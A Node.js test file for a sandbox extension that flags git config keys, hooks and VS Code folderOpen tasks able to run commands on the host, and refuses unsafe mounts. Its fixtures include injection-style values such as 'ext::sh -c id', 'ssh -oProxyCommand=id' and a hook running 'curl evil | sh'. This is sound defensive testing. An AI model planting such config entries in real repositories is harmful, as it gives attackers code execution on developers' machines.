'use strict';
// Detecting files in a mounted folder that tools on the host run, and refusing unsafe sandbox mounts.
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');
const { loadExtension, tempDir } = require('./helpers');

const t = loadExtension()._test;

function write(file, text, mode = 0o644) {
  fs.mkdirSync(path.dirname(file), { recursive: true });
  fs.writeFileSync(file, text);
  fs.chmodSync(file, mode);
}

const CLEAN_CONFIG = `[core]
\trepositoryformatversion = 0
\tfilemode = true
\tbare = false
[remote "origin"]
\turl = https://github.com/me/repo
\tfetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
\tremote = origin
`;

test('parseGitConfig handles sections, subsections, old [a.b] spelling and bare keys', () => {
  const e = t.parseGitConfig('[Core]\n  FSMonitor = ./x\n[diff "Img"]\n textconv = exiftool\n[pager.log]\n[alias] lg = log --oneline\n[x]\n flag\n# c\n; c\n');
  assert.deepEqual(
    e.map((x) => [x.key, x.value]),
    [['core.fsmonitor', './x'], ['diff.Img.textconv', 'exiftool'], ['alias.lg', 'log --oneline'], ['x.flag', 'true']]
  );
});

test('gitEntryRisk flags keys that run commands and leaves normal config alone', () => {
  const risky = [
    ['core.fsmonitor', '/tmp/x.sh'],
    ['core.hookspath', '.husky'],
    ['core.pager', 'sh -c id'],
    ['core.sshcommand', 'ssh -oProxyCommand=id'],
    ['diff.img.textconv', 'evil'],
    ['filter.lfs.smudge', 'git-lfs smudge -- %f'],
    ['merge.x.driver', 'evil %A'],
    ['include.path', '../evil.cfg'],
    ['includeif.gitdir:/x/.path', '../evil.cfg'],
    ['alias.st', '!sh -c id'],
    ['remote.origin.url', 'ext::sh -c id'],
    ['credential.helper', '!evil'],
    ['pager.log', 'evil'],
  ];
  for (const [key, value] of risky) assert.ok(t.gitEntryRisk({ key, value }), `${key} = ${value}`);
  const fine = [
    ['core.fsmonitor', 'true'],
    ['core.fsmonitor', 'false'],
    ['core.filemode', 'true'],
    ['pager.log', 'false'],
    ['alias.lg', 'log --oneline'],
    ['remote.origin.url', 'https://github.com/me/repo'],
    ['branch.main.remote', 'origin'],
  ];
  for (const [key, value] of fine) assert.equal(t.gitEntryRisk({ key, value }), undefined, `${key} = ${value}`);
});

test('hostRunFindings: a clean repo has no findings', () => {
  const dir = tempDir();
  write(path.join(dir, '.git', 'config'), CLEAN_CONFIG);
  write(path.join(dir, '.git', 'hooks', 'pre-commit.sample'), '#!/bin/sh\n', 0o755);
  assert.deepEqual(t.hostRunFindings(dir), []);
});

test('hostRunFindings finds fsmonitor, hooks and folderOpen tasks, also one level down and in worktrees', () => {
  const dir = tempDir();
  write(path.join(dir, '.git', 'config'), CLEAN_CONFIG + '[core]\n\tfsmonitor = /tmp/evil.sh\n');
  write(path.join(dir, '.git', 'hooks', 'post-checkout'), '#!/bin/sh\nid\n', 0o755);
  write(path.join(dir, '.git', 'hooks', 'not-executable'), 'x', 0o644);
  write(path.join(dir, '.vscode', 'tasks.json'), '{ "tasks": [{ "label": "x", "runOptions": { "runOn": "folderOpen" } }] }');
  // A nested repo one level down, and a worktree-style .git file pointing elsewhere.
  write(path.join(dir, 'sub', '.git', 'config'), '[alias]\n\tx = !id\n');
  const wtGit = path.join(dir, 'wt-gitdir');
  write(path.join(wtGit, 'config'), '[diff "a"]\n\ttextconv = evil\n');
  write(path.join(dir, 'wt', '.git'), `gitdir: ${wtGit}\n`);

  const f = t.hostRunFindings(dir);
  const details = f.map((x) => x.detail).join('\n');
  assert.match(details, /core\.fsmonitor = \/tmp\/evil\.sh/);
  assert.match(details, /git hook "post-checkout"/);
  assert.doesNotMatch(details, /not-executable/);
  assert.match(details, /runOn": "folderOpen"/);
  assert.match(details, /alias\.x = !id/);
  assert.match(details, /diff\.a\.textconv = evil/);
  assert.equal(f.length, 5);
});

test('hostRunFindings ids change when the content changes (an edited hook is shown again)', () => {
  const dir = tempDir();
  const hook = path.join(dir, '.git', 'hooks', 'pre-push');
  write(hook, '#!/bin/sh\necho ok\n', 0o755);
  const before = t.hostRunFindings(dir)[0].id;
  assert.equal(t.hostRunFindings(dir)[0].id, before, 'stable while unchanged');
  write(hook, '#!/bin/sh\ncurl evil | sh\n', 0o755);
  assert.notEqual(t.hostRunFindings(dir)[0].id, before);
});

test('mountRefusal blocks home, its parents, and folders containing the wrapper or sbx', () => {
  const home = '/Users/me';
  const o = { home, wrapperPath: '/Users/me/bin/claude-sbx', sbx: '/opt/homebrew/bin/sbx' };
  assert.match(t.mountRefusal(['/Users/me'], o), /home folder/);
  assert.match(t.mountRefusal(['/Users'], o), /home folder/);
  assert.match(t.mountRefusal(['/'], o), /home folder/);
  assert.match(t.mountRefusal(['/Users/me/proj', '/Users/me/bin'], o), /contains the wrapper/);
  assert.match(t.mountRefusal(['/opt'], o), /contains sbx/);
  assert.equal(t.mountRefusal(['/Users/me/proj', '/Users/me/other'], o), undefined);
  assert.equal(t.mountRefusal(['/Users/me/proj'], { home, sbx: 'sbx' }), undefined);
});
